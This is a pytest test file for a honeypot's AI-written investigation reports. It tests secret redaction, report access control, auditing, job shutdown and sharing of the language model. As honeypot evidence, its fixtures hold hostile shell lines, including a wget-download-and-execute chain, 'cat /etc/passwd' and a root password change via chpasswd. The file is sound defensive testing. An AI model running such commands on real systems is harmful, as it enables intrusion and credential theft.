"""Defects found reviewing the investigation-report feature.

Redaction that missed common secret shapes, report jobs and the enrichment
worker competing for the one language model, what happens to a job across a
restart, and who may collect a report that contains original credentials.
"""

import asyncio
import time
from datetime import datetime, timezone

import pytest
from sqlalchemy import select

from app.core.encryption import encrypt_data
from app.core.model_slot import ModelBusy, ModelSlot, model_slot
from app.models import (
    AttackCategory,
    AuditLog,
    HoneypotNode,
    HoneypotSession,
    SessionStatus,
    User,
    UserRole,
)
from app.services import investigation_jobs as jobs_module
from app.services.investigation_jobs import JobsFull, ReportJobs, report_jobs
from app.services.investigation_narrative import build_packet, redact

SECRET = "hunter2-fixture"


def _narrative(records):
    """A minimal valid narrative citing the first evidence line."""
    packet, _ = build_packet(records)
    case = packet["cases"][0]
    line_id, quote = next(iter(case["activity_lines"].items()))
    return {
        "summary": f"Recorded activity [{case['reference']}].",
        "findings": [
            {
                "title": "Recorded command",
                "paragraph": f"The captured line is cited [{case['reference']}].",
                "references": [case["reference"]],
                "evidence_lines": [line_id],
                "quote": quote,
            }
        ],
        "assessment": f"Limited to the recorded evidence [{case['reference']}].",
        "next_steps": f"Review the session [{case['reference']}].",
        "scope": packet["scope"],
        "reviewed_references": [case["reference"]],
        "model": "test-model",
        "generated_at": "2026-01-01T00:00:00+00:00",
    }


@pytest.fixture(autouse=True)
async def isolated_jobs(monkeypatch):
    """No real model, and no job carried between tests."""
    await report_jobs.shutdown()

    async def generate(records):
        return _narrative(records)

    monkeypatch.setattr(jobs_module, "generate_narrative", generate)
    yield
    await report_jobs.shutdown()


@pytest.fixture
async def captured(db_session):
    node = HoneypotNode(name="review-node", protocol="ssh", ip_address="192.0.2.1", port=2222)
    db_session.add(node)
    await db_session.flush()
    commands = f"mysql -uroot -p{SECRET} -e 'show databases'\nuname -a"
    session = HoneypotSession(
        node_id=node.id,
        protocol="ssh",
        attacker_ip="192.0.2.42",
        started_at=datetime.now(timezone.utc),
        status=SessionStatus.COMPLETED,
        attack_category=AttackCategory.EXPLOITATION,
        command_count=2,
        # For a shell session the stored summary is the commands themselves.
        command_summary=commands.replace("\n", " "),
        raw_commands_encrypted=encrypt_data(commands),
    )
    db_session.add(session)
    await db_session.commit()
    return session


async def _finished_report(client, headers, query):
    response = await client.post("/api/v1/export/reports?" + query, headers=headers)
    assert response.status_code == 202, response.text
    identity = response.json()["id"]
    await report_jobs.jobs[identity]["task"]
    return identity


# --- redaction ---------------------------------------------------------------

@pytest.mark.parametrize(
    "text",
    [
        f"password={SECRET}",
        f"pass={SECRET}&user=admin",
        f"PGPASSWORD={SECRET} psql -h db",
        f"export AWS_SECRET_ACCESS_KEY={SECRET}",
        f'{{"username": "root", "password": "{SECRET}"}}',
        f"db_password: '{SECRET}'",
        f"curl http://198.51.100.9/login?user=a&token={SECRET}",
        f"wget http://admin:{SECRET}@198.51.100.9/x",
        f"mysql -uroot -p{SECRET} -e 'select 1'",
        f"sshpass -p {SECRET} ssh root@198.51.100.9",
        f"curl -u admin:{SECRET} http://198.51.100.9/",
        f"echo root:{SECRET} | chpasswd",
        f"mount --password {SECRET} //198.51.100.9/share /mnt",
        f"Authorization: Basic {SECRET}",
        f"Cookie: session={SECRET}",
        f"X-Api-Key: {SECRET}",
        f"curl -H 'Authorization: Bearer {SECRET}aaaaaaaa' http://198.51.100.9/",
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{SECRET}\n-----END OPENSSH PRIVATE KEY-----",
    ],
)
def test_redact_masks_common_secret_shapes(text):
    redacted = redact(text)
    assert SECRET not in redacted, redacted
    assert "REDACTED" in redacted


def test_redact_leaves_ordinary_evidence_readable():
    text = (
        "cd /tmp; wget http://198.51.100.9/a.sh -O .a; chmod +x .a; ./.a\n"
        "cat /etc/passwd\nmkdir -p /var/tmp/x\nnmap -p22,80 198.51.100.0/24\n"
        "author=someone passive=1"
    )
    assert redact(text) == text


def test_redact_is_linear_on_a_long_unbroken_run():
    # A base64 payload is one enormous "word". The first draft of the wider
    # pattern backtracked across it quadratically.
    blob = "QUJD" * 50_000
    started = time.perf_counter()
    assert redact(f"echo {blob} | base64 -d; password={SECRET}").count("REDACTED") == 1
    assert time.perf_counter() - started < 2.0


async def test_analyst_report_redacts_the_stored_summary_too(client, auth_headers, captured):
    """The snapshot redacted the decrypted commands and passed the stored
    summary, which holds the same text for a shell session, through as it was."""
    headers = await auth_headers(UserRole.ANALYST)
    identity = await _finished_report(client, headers, f"session_ids={captured.id}")
    job = report_jobs.jobs[identity]
    for _, analysis in job["records"]:
        assert SECRET not in analysis["evidence_commands"]
        assert SECRET not in (analysis["command_summary"] or "")
    assert SECRET not in repr(job["records"])


async def test_admin_original_evidence_keeps_the_text(client, auth_headers, captured):
    headers = await auth_headers(UserRole.ADMIN)
    identity = await _finished_report(
        client, headers, f"session_ids={captured.id}&include_sensitive=true"
    )
    assert SECRET in report_jobs.jobs[identity]["records"][0][1]["evidence_commands"]


# --- who may read a job --------------------------------------------------------

async def test_sensitive_job_is_never_reused_for_another_request(client, auth_headers, captured):
    admin = await auth_headers(UserRole.ADMIN)
    sensitive = await _finished_report(
        client, admin, f"session_ids={captured.id}&include_sensitive=true"
    )
    # The same administrator, asking for the redacted report of the same
    # session, gets a different job.
    redacted = await _finished_report(client, admin, f"session_ids={captured.id}")
    assert redacted != sensitive
    assert report_jobs.jobs[redacted]["sensitive"] is False

    # Another user asking for the same session gets their own job, and the
    # administrator's job does not exist as far as they can tell.
    analyst = await auth_headers(UserRole.ANALYST)
    own = await _finished_report(client, analyst, f"session_ids={captured.id}")
    assert own not in (sensitive, redacted)
    for path in (f"/api/v1/export/reports/{sensitive}", f"/api/v1/export/reports/{sensitive}/download"):
        assert (await client.get(path, headers=analyst)).status_code == 404


async def test_demoted_admin_cannot_collect_a_sensitive_report(
    client, auth_headers, captured, db_session
):
    headers = await auth_headers(UserRole.ADMIN, email="was-admin@example.com")
    identity = await _finished_report(
        client, headers, f"session_ids={captured.id}&include_sensitive=true"
    )
    user = (
        await db_session.execute(select(User).where(User.email == "was-admin@example.com"))
    ).scalar_one()
    user.role = UserRole.ANALYST
    await db_session.commit()
    from app.core.security import invalidate_user_state

    invalidate_user_state(user.id)

    assert (await client.get(f"/api/v1/export/reports/{identity}", headers=headers)).status_code == 403
    download = await client.get(f"/api/v1/export/reports/{identity}/download", headers=headers)
    assert download.status_code == 403


async def test_request_and_download_are_audited_with_the_source(client, auth_headers, captured, db_session):
    headers = await auth_headers(UserRole.ANALYST)
    identity = await _finished_report(client, headers, f"session_ids={captured.id}")
    await client.get(f"/api/v1/export/reports/{identity}", headers=headers)
    await client.get(f"/api/v1/export/reports/{identity}/download", headers=headers)

    rows = (
        await db_session.execute(
            select(AuditLog).where(AuditLog.action.in_(["ai_report_requested", "ai_report_downloaded"]))
        )
    ).scalars().all()
    assert sorted(r.action for r in rows) == ["ai_report_downloaded", "ai_report_requested"]
    assert all(r.user_id is not None and r.ip_address for r in rows)
    assert all(r.details["report_id"] == identity for r in rows)


# --- restart and shutdown -------------------------------------------------------

async def test_job_lost_in_a_restart_answers_generate_again(client, auth_headers, captured):
    headers = await auth_headers(UserRole.ANALYST)
    identity = await _finished_report(client, headers, f"session_ids={captured.id}")

    # A restart: the process's memory, and every job in it, is gone.
    report_jobs.jobs.clear()

    for path in (f"/api/v1/export/reports/{identity}", f"/api/v1/export/reports/{identity}/download"):
        response = await client.get(path, headers=headers)
        assert response.status_code == 404
        assert "Generate it again" in response.json()["detail"]


async def test_shutdown_cancels_a_job_that_is_still_being_written(monkeypatch):
    started = asyncio.Event()

    async def never_finishes(records):
        started.set()
        await asyncio.sleep(3600)

    monkeypatch.setattr(jobs_module, "generate_narrative", never_finishes)
    jobs = ReportJobs()
    job = jobs.submit(owner=1, records=[({"session_uuid": "a"}, {"category": "benign"})])
    await asyncio.wait_for(started.wait(), timeout=5)

    await jobs.shutdown()

    assert job["task"].done()
    assert job["status"] == "failed" and "generate it again" in job["error"].lower()
    assert jobs.jobs == {}
    assert model_slot.holder is None  # the model was released


async def test_one_user_cannot_hold_every_place_in_the_queue(monkeypatch):
    async def slow(records):
        await asyncio.sleep(3600)

    monkeypatch.setattr(jobs_module, "generate_narrative", slow)
    jobs = ReportJobs()
    try:
        jobs.submit(owner=1, records=[({"session_uuid": "a"}, {})])
        with pytest.raises(JobsFull):
            jobs.submit(owner=1, records=[({"session_uuid": "b"}, {})])
        # A second user still gets a place.
        jobs.submit(owner=2, records=[({"session_uuid": "c"}, {})])
    finally:
        await jobs.shutdown()


# --- sharing the model with the enrichment worker ---------------------------------

async def test_report_waits_for_the_enrichment_call_in_progress(monkeypatch):
    order = []
    release_enrichment = asyncio.Event()

    async def enrichment_call():
        async with model_slot.hold("enrichment"):
            order.append("enrichment starts")
            await release_enrichment.wait()
            order.append("enrichment ends")

    async def generate(records):
        order.append("report starts")
        return _narrative(records)

    monkeypatch.setattr(jobs_module, "generate_narrative", generate)
    worker = asyncio.create_task(enrichment_call())
    await asyncio.sleep(0)

    jobs = ReportJobs()
    job = jobs.submit(owner=1, records=[({"session_uuid": "a", "protocol": "ssh"}, {"evidence_commands": "id"})])
    await asyncio.sleep(0.05)
    assert job["status"] == "queued" and "Waiting" in job["message"]
    assert order == ["enrichment starts"]

    release_enrichment.set()
    await job["task"]
    await worker
    assert order == ["enrichment starts", "enrichment ends", "report starts"]
    assert job["status"] == "complete"


async def test_report_gives_up_cleanly_when_the_model_stays_busy(monkeypatch):
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "REPORT_MODEL_WAIT_SECONDS", 0.05)
    release = asyncio.Event()

    async def long_enrichment():
        async with model_slot.hold("enrichment"):
            await release.wait()

    worker = asyncio.create_task(long_enrichment())
    await asyncio.sleep(0)
    jobs = ReportJobs()
    job = jobs.submit(owner=1, records=[({"session_uuid": "a"}, {"evidence_commands": "id"})])
    await job["task"]
    release.set()
    await worker

    assert job["status"] == "failed"
    assert "busy" in job["error"] and "again" in job["error"]


async def test_model_slot_alternates_between_two_callers():
    """Neither side can take turn after turn while the other is waiting."""
    slot = ModelSlot()
    turns = []

    async def caller(name, count):
        for _ in range(count):
            async with slot.hold(name):
                turns.append(name)
                await asyncio.sleep(0)

    await asyncio.gather(caller("enrichment", 4), caller("report", 4))
    # Strict alternation once both are queued.
    assert turns[:8] == ["enrichment", "report"] * 4


async def test_model_slot_times_out_with_modelbusy():
    slot = ModelSlot()
    async with slot.hold("enrichment"):
        with pytest.raises(ModelBusy):
            async with slot.hold("report", wait=0.01):
                pass
    # And is usable again afterwards.
    async with slot.hold("report", wait=0.01):
        assert slot.holder == "report"
